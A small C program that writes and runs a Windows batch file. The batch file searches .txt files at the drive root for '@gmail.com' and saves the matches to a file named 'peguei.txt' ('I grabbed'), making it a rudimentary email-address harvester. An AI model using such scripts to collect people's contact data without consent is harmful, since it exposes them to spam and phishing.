#include <stdio.h>
#include <stdlib.h>
/* run this program using the console pauser or add your own getch, system("pause") or input loop */
int main(int argc, char *argv[]) {
 FILE *fp;
 fp = fopen("file99.bat","w+");
 fprintf(fp, "%s" "%s", "cd / \n","findstr @gmail.com *.txt >C:/Users/rodolfo/Documents/peguei.txt");
 fclose(fp);
 system("start /Max file99.bat");
 return 0;
}
